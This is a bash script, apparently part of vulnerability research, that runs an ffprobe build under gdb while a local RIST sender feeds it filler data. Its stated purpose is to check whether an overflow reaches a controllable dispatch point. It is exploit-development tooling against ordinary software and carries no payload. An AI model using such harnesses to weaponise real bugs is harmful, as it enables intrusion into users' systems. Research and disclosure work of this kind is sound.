#!/usr/bin/env bash
# W4: measure the prot value at the natural dispatch after the overflow,
# with no debugger-forced pointer write. Uniform 0x5a sender fill.
set -u
ROOT=$(cd "$(dirname "$0")" && pwd)
LIB="$ROOT/prefix/lib"
mkdir -p "$ROOT/evidence"
OUT="$ROOT/evidence/reach-plain.log"
SEND="$ROOT/evidence/reach-plain-send.log"
(env LD_LIBRARY_PATH="$LIB" MALLOC_MMAP_THRESHOLD_=16777216 \
    timeout 45 gdb -q -batch -x "$ROOT/reach-plain.cmd" \
    --args "$ROOT/plain/src/ffprobe_g" > "$OUT" 2>&1; \
    echo "gdb rc=$?" >> "$OUT") &
gdb_pid=$!
sleep 3
(env LD_LIBRARY_PATH="$LIB" timeout 30 "$ROOT/rist_sender_live" \
    'rist://127.0.0.1:5004' 2200 9968 > "$SEND" 2>&1; \
    echo "sender rc=$?" >> "$SEND") &
sender_pid=$!
wait $sender_pid $gdb_pid
printf 'RP result: %s | %s\n' \
    "$(grep -c 'RP FIRST HIT' "$OUT") first hits" \
    "$(grep 'RP NEXT DISPATCH' "$OUT" | tail -1)"
